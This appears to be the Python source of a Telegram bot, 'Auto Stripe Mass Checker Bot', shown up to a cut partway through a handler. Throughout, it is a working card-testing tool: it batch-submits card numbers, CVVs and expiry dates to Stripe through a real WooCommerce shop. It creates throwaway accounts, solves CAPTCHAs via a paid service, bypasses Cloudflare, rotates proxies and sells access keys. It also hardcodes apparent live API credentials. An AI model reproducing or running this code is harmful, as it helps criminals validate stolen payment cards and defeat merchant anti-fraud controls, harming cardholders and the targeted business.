import requests
import json
import re
import time
import random
import datetime
import os
import threading
import asyncio
import logging
import uuid
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any, Optional
from faker import Faker
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Intentar importar cloudscraper (bypass Cloudflare)
try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

# ========== CONFIGURACIÃ“N ==========
BOT_TOKEN = os.getenv('BOT_TOKEN', '8815662392:AAEXbjhB0IFCPL4WL1CKfWKw4jwy6ZjbN6A')
ALLOWED_USERS = list(map(int, os.getenv('ALLOWED_USERS', '7778032088').split(','))) if os.getenv('ALLOWED_USERS') else []
ADMIN_IDS = list(map(int, os.getenv('ADMIN_IDS', '7778032088').split(','))) if os.getenv('ADMIN_IDS') else []
PROXY_FILE = os.getenv('PROXY_FILE', 'proxies.txt')
KEYS_FILE = os.getenv('KEYS_FILE', 'redeem_keys.json')
WHITELIST_FILE = os.getenv('WHITELIST_FILE', 'whitelist.json')

# ========== CONFIGURACIÃ“N CAPTCHA ==========
NOPECHA_API_KEY = os.getenv('NOPECHA_API_KEY', 'sub_1UPvEBCRwBwvt6ptgrzQNfnS')  # API key de nopecha.com
CAPTCHA_SERVICE = os.getenv('CAPTCHA_SERVICE', 'nopecha')  # 'nopecha' o 'none'
CAPTCHA_TIMEOUT = int(os.getenv('CAPTCHA_TIMEOUT', '180'))  # Timeout mÃ¡ximo esperando resoluciÃ³n

MAX_MASS = 30
MAX_FILE_CARDS = 50
MAX_THREADS = 1

# Estados de conversaciÃ³n
MASS_WAIT_CARDS = 1
MTXT_WAIT_FILE = 1

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== CARGA INICIAL ==========
faker = Faker()
print_lock = threading.Lock()

# Cargar proxies al iniciar
proxies_list = []
if os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies_list = [line.strip() for line in f if line.strip()]


# ========== PROGRESO ==========
class ProgressTracker:
    def __init__(self, total):
        self.total = total
        self.completed = 0
        self.approved = 0
        self.declined = 0
        self.errors = 0
        self.results = []
        self.lock = threading.Lock()
        self.done = threading.Event()

    def update(self, result_line: str):
        with self.lock:
            self.completed += 1
            if "Card Approved Success" in result_line:
                self.approved += 1
            elif "Declined" in result_line:
                self.declined += 1
            else:
                self.errors += 1
            self.results.append(result_line)

    def get_stats(self):
        with self.lock:
            return {
                'completed': self.completed,
                'total': self.total,
                'approved': self.approved,
                'declined': self.declined,
                'errors': self.errors,
                'results': self.results.copy()
            }


# ========== SISTEMA DE CAPTCHA ==========
def create_session_with_cloudflare(proxies=None):
    """
    Crea una sesiÃ³n que maneja Cloudflare automÃ¡ticamente.
    Si cloudscraper no estÃ¡ instalado, usa requests normal.
    """
    if HAS_CLOUDSCRAPER:
        scraper = cloudscraper.create_scraper(
            interpreter='js2py',
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False,
                'desktop': True,
            }
        )
        if proxies:
            scraper.proxies = proxies
        return scraper
    else:
        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        return session


def detect_captcha(html_text: str, response_url: str = "") -> Optional[dict]:
    """
    Detecta si hay un captcha en la respuesta HTML.
    Retorna un dict con tipo y datos del captcha, o None si no hay.
    """
    captcha_info = None
    
    # Detectar reCAPTCHA v2/v3
    recaptcha_match = re.search(
        r'data-sitekey=["\']([^"\']+)["\']', html_text
    )
    if recaptcha_match:
        sitekey = recaptcha_match.group(1)
        action_match = re.search(r'data-action=["\']([^"\']+)["\']', html_text)
        action = action_match.group(1) if action_match else "submit"
        
        captcha_info = {
            "type": "recaptcha",
            "sitekey": sitekey,
            "pageurl": response_url or "https://dilaboards.com",
            "action": action,
            "version": "v3" if re.search(r'data-action=', html_text) else "v2"
        }
        logger.info(f"ðŸ” reCAPTCHA detectado: sitekey={sitekey}, version={captcha_info['version']}")
        return captcha_info
    
    # Detectar hCaptcha
    hcaptcha_match = re.search(
        r'data-sitekey=["\']([^"\']+)["\'].*?hcaptcha', html_text, re.DOTALL
    )
    if not hcaptcha_match:
        hcaptcha_match = re.search(
            r'src=["\'].*?hcaptcha\.com.*?sitekey=([^"&\']+)', html_text
        )
    if hcaptcha_match:
        sitekey = hcaptcha_match.group(1)
        captcha_info = {
            "type": "hcaptcha",
            "sitekey": sitekey,
            "pageurl": response_url or "https://dilaboards.com",
        }
        logger.info(f"ðŸ” hCaptcha detectado: sitekey={sitekey}")
        return captcha_info
    
    # Detectar Cloudflare Turnstile
    turnstile_match = re.search(
        r'data-sitekey=["\']([^"\']+)["\'].*?cf-turnstile', html_text, re.DOTALL
    )
    if not turnstile_match:
        turnstile_match = re.search(
            r'src=["\'].*?challenges\.cloudflare\.com.*?sitekey=([^"&\']+)', html_text
        )
    if turnstile_match:
        sitekey = turnstile_match.group(1)
        captcha_info = {
            "type": "turnstile",
            "sitekey": sitekey,
            "pageurl": response_url or "https://dilaboards.com",
        }
        logger.info(f"ðŸ” Cloudflare Turnstile detectado: sitekey={sitekey}")
        return captcha_info
    
    # Detectar FunCaptcha (Arkose Labs)
    funcaptcha_match = re.search(
        r'data-pkey=["\']([^"\']+)["\'].*?funcaptcha', html_text, re.DOTALL
    )
    if funcaptcha_match:
        captcha_info = {
            "type": "funcaptcha",
            "sitekey": funcaptcha_match.group(1),
            "pageurl": response_url or "https://dilaboards.com",
            "surl": "https://api.arkoselabs.com",
        }
        logger.info(f"ðŸ” FunCaptcha detectado: sitekey={captcha_info['sitekey']}")
        return captcha_info
    
    # Detectar GeeTest
    geetest_match = re.search(
        r'gt=["\']([^"\']+)["\'].*?challenge=["\']([^"\']+)["\']', html_text
    )
    if geetest_match:
        captcha_info = {
            "type": "geetest",
            "gt": geetest_match.group(1),
            "challenge": geetest_match.group(2),
            "pageurl": response_url or "https://dilaboards.com",
        }
        logger.info(f"ðŸ” GeeTest detectado")
        return captcha_info
    
    # Detectar Cloudflare challenge (JS challenge)
    if 'cf-browser-verification' in html_text or 'cf_challenge' in html_text:
        captcha_info = {
            "type": "cloudflare_challenge",
            "pageurl": response_url or "https://dilaboards.com",
        }
        logger.info("ðŸ” Cloudflare JS Challenge detectado (cloudscraper lo manejarÃ¡ automÃ¡ticamente)")
        return captcha_info
    
    return None


def solve_captcha_nopecha(captcha_info: dict) -> Optional[str]:
    """
    Resuelve un captcha usando el servicio NopeCHA.
    Retorna el token resuelto o None si falla.
    """
    if not NOPECHA_API_KEY:
        logger.error("âŒ NOPECHA_API_KEY no configurada")
        return None
    
    api_url = "https://api.nopecha.com/token"
    params = {
        "key": NOPECHA_API_KEY,
    }
    
    ctype = captcha_info["type"]
    
    if ctype == "recaptcha":
        version = captcha_info.get("version", "v2")
        if version == "v3":
            params["type"] = "recaptcha3"
            params["action"] = captcha_info.get("action", "submit")
        else:
            params["type"] = "recaptcha2"
        params["sitekey"] = captcha_info.get("sitekey", "")
        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
        
    elif ctype == "hcaptcha":
        params["type"] = "hcaptcha"
        params["sitekey"] = captcha_info.get("sitekey", "")
        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
        
    elif ctype == "turnstile":
        params["type"] = "turnstile"
        params["sitekey"] = captcha_info.get("sitekey", "")
        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
        
    elif ctype == "funcaptcha":
        params["type"] = "funcaptcha"
        params["sitekey"] = captcha_info.get("sitekey", "")
        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
        
    elif ctype == "geetest":
        params["type"] = "geetest"
        params["gt"] = captcha_info.get("gt", "")
        params["challenge"] = captcha_info.get("challenge", "")
        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
        
    else:
        logger.error(f"âŒ Tipo de captcha no soportado por NopeCHA: {ctype}")
        return None
    
    logger.info(f"ðŸ“¤ Enviando captcha a NopeCHA ({ctype})...")
    
    start_time = time.time()
    while time.time() - start_time < CAPTCHA_TIMEOUT:
        try:
            resp = requests.get(api_url, params=params, timeout=60)
            data = resp.json()
            
            if "data" in data and data["data"]:
                token = data["data"]
                logger.info("âœ… Captcha resuelto exitosamente con NopeCHA")
                return token
            
            msg = data.get("message", "").lower()
            if data.get("error") == 1 or "not ready" in msg or "pending" in msg or "processing" in msg:
                logger.info(f"â³ Esperando resoluciÃ³n NopeCHA... ({int(time.time() - start_time)}s)")
                time.sleep(5)
                continue
            
            logger.error(f"âŒ Error NopeCHA: {data}")
            return None
            
        except requests.exceptions.Timeout:
            logger.warning("â³ Timeout en solicitud NopeCHA, reintentando...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"âŒ Error en NopeCHA: {str(e)}")
            time.sleep(5)
    
    logger.error(f"âŒ Timeout esperando resoluciÃ³n de NopeCHA ({CAPTCHA_TIMEOUT}s)")
    return None


def solve_captcha(captcha_info: dict) -> Optional[str]:
    """
    FunciÃ³n principal para resolver captcha.
    Elige el servicio segÃºn configuraciÃ³n.
    """
    if not NOPECHA_API_KEY or CAPTCHA_SERVICE == 'none':
        logger.warning("âš ï¸ Captcha detectado pero no hay API key configurada. Saltando...")
        return None
    
    if captcha_info["type"] == "cloudflare_challenge":
        logger.info("â„¹ï¸ Cloudflare JS Challenge - cloudscraper lo manejarÃ¡")
        return "CLOUDFLARE_SKIP"
    
    logger.info(f"ðŸ§© Resolviendo captcha tipo: {captcha_info['type']} usando {CAPTCHA_SERVICE}...")
    
    if CAPTCHA_SERVICE.lower() == 'nopecha':
        token = solve_captcha_nopecha(captcha_info)
    else:
        logger.error(f"âŒ Servicio de captcha no soportado: {CAPTCHA_SERVICE}")
        token = None
    
    if token:
        logger.info("âœ… Captcha resuelto!")
    else:
        logger.error("âŒ FallÃ³ la resoluciÃ³n del captcha")
    
    return token


def inject_captcha_token(html: str, token: str, captcha_type: str) -> str:
    """
    Inyecta el token resuelto en el HTML para reenviar el formulario.
    """
    if captcha_type == "recaptcha":
        if 'g-recaptcha-response' in html:
            html = re.sub(
                r'name="g-recaptcha-response"[^>]*value="[^"]*"',
                f'name="g-recaptcha-response" value="{token}"',
                html
            )
        else:
            html = html.replace(
                '</form>',
                f'<input type="hidden" name="g-recaptcha-response" value="{token}"></form>'
            )
    
    elif captcha_type == "hcaptcha":
        if 'h-captcha-response' in html:
            html = re.sub(
                r'name="h-captcha-response"[^>]*value="[^"]*"',
                f'name="h-captcha-response" value="{token}"',
                html
            )
        else:
            html = html.replace(
                '</form>',
                f'<input type="hidden" name="h-captcha-response" value="{token}"></form>'
            )
    
    elif captcha_type == "turnstile":
        if 'cf-turnstile-response' in html:
            html = re.sub(
                r'name="cf-turnstile-response"[^>]*value="[^"]*"',
                f'name="cf-turnstile-response" value="{token}"',
                html
            )
    
    return html


# ========== SISTEMA DE KEYS REDIMIBLES ==========
def load_json(filepath):
    if not os.path.exists(filepath):
        return {}
    try:
        with open(filepath, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}


def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)


def generate_key(days_valid: int) -> dict:
    keys_db = load_json(KEYS_FILE)
    
    key_id = str(uuid.uuid4())[:12].upper()
    created_at = int(time.time())
    expires_at = created_at + (days_valid * 86400)
    
    keys_db[key_id] = {
        "created_at": created_at,
        "expires_at": expires_at,
        "days_valid": days_valid,
        "redeemed": False,
        "redeemed_by": None,
        "redeemed_at": None
    }
    
    save_json(KEYS_FILE, keys_db)
    return {"key": key_id, "days": days_valid, "expires_at": expires_at}


def redeem_key(key_id: str, user_id: int) -> tuple[bool, str]:
    keys_db = load_json(KEYS_FILE)
    whitelist = load_json(WHITELIST_FILE)
    
    now = int(time.time())
    whitelist = {uid: exp for uid, exp in whitelist.items() if exp > now}
    
    if key_id not in keys_db:
        return False, "âŒ Key invÃ¡lida o no existe."
    
    key_data = keys_db[key_id]
    
    if key_data.get("redeemed", False):
        return False, "âŒ Esta key ya fue redimida anteriormente."
    
    if time.time() > key_data["expires_at"]:
        return False, "âŒ Esta key ha expirado (nunca fue redimida a tiempo)."
    
    days = key_data["days_valid"]
    expiration = int(time.time()) + (days * 86400)
    
    whitelist[str(user_id)] = expiration
    
    keys_db[key_id]["redeemed"] = True
    keys_db[key_id]["redeemed_by"] = user_id
    keys_db[key_id]["redeemed_at"] = int(time.time())
    
    save_json(KEYS_FILE, keys_db)
    save_json(WHITELIST_FILE, whitelist)
    
    exp_date = datetime.datetime.fromtimestamp(expiration).strftime('%Y-%m-%d %H:%M:%S')
    return True, f"âœ… Key redimida exitosamente.\nðŸŽŸï¸ Acceso otorgado por {days} dÃ­a(s).\nðŸ“… Expira: {exp_date}"


def has_access(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    
    if ALLOWED_USERS and user_id in ALLOWED_USERS:
        return True
    
    if not ALLOWED_USERS and not ADMIN_IDS:
        whitelist = load_json(WHITELIST_FILE)
        if str(user_id) in whitelist:
            if whitelist[str(user_id)] > int(time.time()):
                return True
        return True  # Sin restricciÃ³n = acceso libre
    
    whitelist = load_json(WHITELIST_FILE)
    if str(user_id) in whitelist:
        expiration = whitelist[str(user_id)]
        if expiration > int(time.time()):
            return True
        else:
            del whitelist[str(user_id)]
            save_json(WHITELIST_FILE, whitelist)
    
    return False


# ========== FUNCIONES ORIGINALES (con soporte captcha) ==========
def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None,
    proxies: Optional[Dict[str, str]] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None: data = {}
    if params is None: params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower(): params[key] = value
            else: data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'proxies': proxies,
        'timeout': 30
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    response = req_session.request(method, **request_kwargs)
    return response


def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']
        
        def find_msg(obj):
            if isinstance(obj, dict):
                if 'message' in obj: return obj['message']
                for v in obj.values():
                    res = find_msg(v)
                    if res: return res
            return None
        
        res_msg = find_msg(response_json)
        if res_msg: return res_msg

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"
    except:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:100]}..."


def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
    """VersiÃ³n mejorada con manejo de captcha."""
    session = create_session_with_cloudflare(proxies)
    base_url = 'https://dilaboards.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    
    try:
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {'User-Agent': user_ag}
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
        
        captcha = detect_captcha(response_1.text, url_1)
        if captcha:
            logger.info(f"âš ï¸ Captcha detectado en GET inicial: {captcha['type']}")
            if captcha['type'] == 'cloudflare_challenge' and HAS_CLOUDSCRAPER:
                logger.info("ðŸ”„ Reintentando con cloudscraper...")
                response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
                captcha = detect_captcha(response_1.text, url_1)
            
            if captcha and captcha['type'] != 'cloudflare_challenge':
                token = solve_captcha(captcha)
                if token and token != "CLOUDFLARE_SKIP":
                    modified_html = inject_captcha_token(response_1.text, token, captcha['type'])
                    logger.info("ðŸ”„ Reintentando con token de captcha...")
                    form_action_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', response_1.text)
                    form_action = form_action_match.group(1) if form_action_match else url_1
                    if not form_action.startswith('http'):
                        form_action = base_url + form_action
                    
                    form_data = {}
                    for input_match in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', modified_html):
                        form_data[input_match.group(1)] = input_match.group(2)
                    
                    if captcha['type'] == 'recaptcha':
                        form_data['g-recaptcha-response'] = token
                    elif captcha['type'] == 'hcaptcha':
                        form_data['h-captcha-response'] = token
                    elif captcha['type'] == 'turnstile':
                        form_data['cf-turnstile-response'] = token
                    
                    response_1 = auto_request(
                        form_action, method='POST',
                        headers=headers_1, data=form_data,
                        session=session, proxies=proxies
                    )
        
        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        pk_match = re.search('"key":"(.*?)"', response_1.text)
        
        if not reg_match or not pk_match:
            pk_match = re.search(r'pk=["\']([^"\']+)["\']', response_1.text)
            if not reg_match:
                return f"Failed to extract session tokens. Possible captcha block. Response snippet: {response_1.text[:300]}"
            if not pk_match:
                return f"Failed to extract Stripe pk. Response snippet: {response_1.text[:300]}"
        
        regester_nouce = reg_match.group(1)
        pk = pk_match.group(1)

        data_2 = {
            'email': faker.email(),
            'woocommerce-register-nonce': regester_nouce,
            'register': 'Register',
        }
        response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)
        
        captcha2 = detect_captcha(response_2.text, url_1)
        if captcha2 and captcha2['type'] != 'cloudflare_challenge':
            logger.info(f"âš ï¸ Captcha en registro: {captcha2['type']}")
            token2 = solve_captcha(captcha2)
            if token2 and token2 != "CLOUDFLARE_SKIP":
                form_data_2 = data_2.copy()
                if captcha2['type'] == 'recaptcha':
                    form_data_2['g-recaptcha-response'] = token2
                elif captcha2['type'] == 'hcaptcha':
                    form_data_2['h-captcha-response'] = token2
                response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=form_data_2, session=session, proxies=proxies)
        
        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)
        if not nonce_match:
            return f"Failed to extract ajax nonce. Response: {response_2.text[:200]}"
        ajax_nonce = nonce_match.group(1)

        url_3 = 'https://api.stripe.com/v1/payment_methods'
        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': client_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
            '_stripe_version': '2024-06-20',
        }
        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)
        
        if response_3.status_code != 200:
            if 'captcha' in response_3.text.lower() or 'challenge' in response_3.text.lower():
                logger.warning("âš ï¸ Stripe respondiÃ³ con desafÃ­o de seguridad")
                return "Stripe Security Challenge | Posible captcha de Stripe"
            return f"Stripe Error: {extract_message(response_3)}"
        
        pm = response_3.json().get('id')
        if not pm:
            return f"Failed to get payment method ID. Response: {response_3.text[:200]}"

        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)
        
        try:
            resp_json = response_4.json()
            if resp_json.get("success"):
                return "Card Approved SuccessðŸƒ"
            else:
                msg = extract_message(response_4)
                return f"Declinedâ™¨ï¸ | {msg}"
        except:
            captcha4 = detect_captcha(response_4.text)
            if captcha4:
                return f"Captcha bloqueÃ³ la request final: {captcha4['type']}"
            return f"Unexpected response: {response_4.text[:200]}"
            
    except Exception as e:
        return f"Error: {str(e)}"


def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
    return None


def process_card(card, proxies_list, serial_num):
    raw_proxy = random.choice(proxies_list) if proxies_list else None
    proxy_dict = format_proxy(raw_proxy)
    
    try:
        c_data = card.split('|')
        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data
            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
        else:
            result = "Error: Invalid Format"
    except Exception as e:
        result = f"Error: {str(e)}"

    line = f"[{serial_num}] {card} ---> "
    if raw_proxy:
        line += f"({raw_proxy.split(':')[0]}) ---> "
    line += result
    return line


def process_cards_batch(cards, proxies, tracker=None):
    results = []
    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {
                executor.submit(process_card, card, proxies, i + 1): i
                for i, card in enumerate(cards)
            }
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception as e:
                    result = f"Error in thread: {str(e)}"
                if tracker:
                    tracker.update(result)
                results.append(result)
    finally:
        if tracker:
            tracker.done.set()
    
    def get_serial(line):
        match = re.match(r'\[(\d+)\]', line)
        return int(match.group(1)) if match else 0
    results.sort(key=get_serial)
    return results


# ========== FUNCIONES AUXILIARES DEL BOT ==========
def check_access(update: Update) -> bool:
    user_id = update.effective_user.id
    return has_access(user_id)


def parse_cards(text: str, max_cards: int = None):
    lines = [line.strip() for line in text.strip().split('\n') if line.strip()]
    cards = []
    for line in lines:
        line = line.strip().strip('`').strip()
        parts = line.split('|')
        if len(parts) == 4:
            cards.append(line)
    if max_cards:
        cards = cards[:max_cards]
    return cards


async def run_with_progress(update: Update, cards, origin_prefix=""):
    tracker = ProgressTracker(len(cards))
    msg = await update.message.reply_text("â³ Iniciando procesamiento...")
    
    loop = asyncio.get_event_loop()
    batch_future = loop.run_in_executor(None, process_cards_batch, cards, proxies_list, tracker)
    
    last_text = None
    while not tracker.done.is_set():
        await asyncio.sleep(2)
        stats = tracker.get_stats()
        if stats['total'] == 0:
            continue
        pct = int((stats['completed'] / stats['total']) * 100)
        filled = int(pct / 10)
        bar = 'â–ˆ' * filled + 'â–‘' * (10 - filled)
        text = (
            f"â³ *{origin_prefix}Procesando...*\n"
            f"`[{bar}]` *{pct}%*\n\n"
            f"âœ… *Hits Approved:* `{stats['approved']}`\n"
            f"âŒ Rechazadas: `{stats['declined']}`\n"
            f"âš ï¸ Errores: `{stats['errors']}`\n"
            f"ðŸ“Š Completadas: `{stats['completed']}/{stats['total']}`"
        )
        if text != last_text:
            try:
                await msg.edit_text(text, parse_mode='Markdown')
                last_text = text
            except Exception:
                pass
    
    results = await batch_future
    stats = tracker.get_stats()
    header = (
        f"ðŸ“Š *Resultados ({len(results)} tarjetas)*\n"
        f"âœ… *Hits Approved:* {stats['approved']} | âŒ Rechazadas: {stats['declined']} | âš ï¸ Errores: {stats['errors']}\n\n"
    )
    
    result_text = '\n'.join(results)
    if len(result_text) > 3500:
        result_text = result_text[:3500] + "\n\nâš ï¸ Resultados truncados..."
    
    final_text = header + f"```\n{result_text}\n```"
    await msg.edit_text(final_text, parse_mode='Markdown')


# ========== HANDLERS DEL BOT ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not has_access(user_id):
        welcome = (
            "ðŸ¤– *Auto Stripe Mass Checker Bot*\n\n"
            "âŒ No tienes acceso.\n\n"
            "Necesitas una key vÃ¡lida para usar este bot.\n"
            "Usa `/redeem <key>` si tienes una.\n\n"
            "Si no tienes una, contacta al administrador."
        )
        await update.message.reply_text(welcome, parse_mode='Markdown')
        return
    
    captcha_status = "âœ… Activo" if NOPECHA_API_KEY else "âš ï¸ No configurado"
    captcha_service = CAPTCHA_SERVICE if NOPECHA_API_KEY else "N/A"
    cf_status = "âœ… sÃ­" if HAS_CLOUDSCRAPER else "âŒ no (instala: pip install cloudscraper)"
    
    welcome = (
        "ðŸ¤– *Auto Stripe Mass Checker Bot*\n\n"
        "ðŸ›¡ï¸ *ProtecciÃ³n Captcha:*\n"
        f"   â€¢ Servicio: `{captcha_service}` ({captcha_status})\n"
        f"   â€¢ Cloudflare bypass: {cf_status}\n\n"
        "*Comandos:*\n"
        "`/chk <tarjeta>` - Verificar una tarjeta\n"
        "`/mass` - Verificar hasta 15 tarjetas\n"
        "`/mtxt` - Verificar desde archivo .txt\n"
        "`/redeem <key>` - Canjear key de acceso\n"
        "`/status` - Estado de tu acceso\n"
        "`/help` - Mostrar ayuda"
    )
    
    if user_id in ADMIN_IDS:
        welcome += "\n\n*ðŸ”‘ Admin:* `/genkey <dÃ­as>`, `/keys`, `/whitelist`"
    
    await update.message.reply_text(welcome, parse_mode='Markdown')


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.full_name
    
    captcha_line = f"ðŸ§© Captcha: {'âœ… Activo (' + CAPTCHA_SERVICE + ')' if NOPECHA_API_KEY else 'âŒ No configurado'}"
    cf_line = f"â˜ï¸ Cloudflare: {'âœ… Bypass activo' if HAS_CLOUDSCRAPER else 'âŒ No instalado (pip install cloudscraper)'}"
    
    if user_id in ADMIN_IDS:
        await update.message.reply_text(
            f"ðŸ‘‘ *Estado de Acceso*\n\n"
            f"Usuario: `{username}` (ID: `{user_id}`)\n"
            f"Rango: ðŸ‘‘ *Administrador*\n"
            f"Acceso: âœ… Ilimitado\n\n"
            f"{captcha_line}\n"
            f"{cf_line}",
            parse_mode='Markdown'
        )
        return
    
    if ALLOWED_USERS and user_id in ALLOWED_USERS:
        await update.message.reply_text(
            f"ðŸ“‹ *Estado de Acceso*\n\n"
            f"Usuario: `{username}` (ID: `{user_id}`)\n"
            f"Rango: ðŸ‘¤ Usuario autorizado\n"
            f"Acceso: âœ… Ilimitado (whitelist estÃ¡tica)\n\n"
            f"{captcha_line}\n"
            f"{cf_line}",
            parse_mode='Markdown'
        )
        return
    
    whitelist = load_json(WHITELIST_FILE)
    if str(user_id) in whitelist:
        expiration = whitelist[str(user_id)]
        if expiration > int(time.time()):
            remaining = expiration - int(time.time())
            days = remaining // 86400
            hours = (remaining % 86400) // 3600
            exp_date = datetime.datetime.fromtimestamp(expiration).strftime('%Y-%m-%d %H:%M:%S')
            
            await update.message.reply_text(
                f"ðŸ“‹ *Estado de Acceso*\n\n"
                f"Usuario: `{username}` (ID: `{user_id}`)\n"
                f"Rango: ðŸ”‘ Key redimida\n"
                f"Acceso: âœ… Activo\n"
                f"Expira: `{exp_date}`\n"
                f"Tiempo restante: {days}d {hours}h\n\n"
                f"{captcha_line}\n"
                f"{cf_line}",
                parse_mode='Markdown'
            )
            return
        else:
            del whitelist[str(user_id)]
            save_json(WHITELIST_FILE, whitelist)
    
    await update.message.reply_text(
        f"ðŸ“‹ *Estado de Acceso*\n\n"
        f"Usuario: `{username}` (ID: `{user_id}`)\n"
        f"Acceso: âŒ *Sin acceso*\n\n"
        f"Usa `/redeem <key>` si tienes una key.\n\n"
        f"{captcha_line}\n"
        f"{cf_line}",
        parse_mode='Markdown'
    )


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "âŒ Uso: `/redeem <KEY>`\n"
            "Ejemplo: `/redeem ABC123DEF456`",
            parse_mode='Markdown'
        )
        return
    
    key_id = context.args[0].upper().strip()
    user_id = update.effective_user.id
    
    success, message = redeem_key(key_id, user_id)
    await update.message.reply_text(message, parse_mode='Markdown')


async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("âŒ No tienes permisos para generar keys.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "âŒ Uso: `/genkey <dÃ­as>`\n"
            "Ejemplo: `/genkey 30`",
            parse_mode='Markdown'
        )
        return
    
    try:
        days = int(context.args[0])
        if days < 1:
            await update.message.reply_text("âŒ Los dÃ­as deben ser al menos 1.")
            return
    except ValueError:
        await update.message.reply_text("âŒ Los dÃ­as deben ser un nÃºmero entero.")
        return
    
    key_info = generate_key(days)
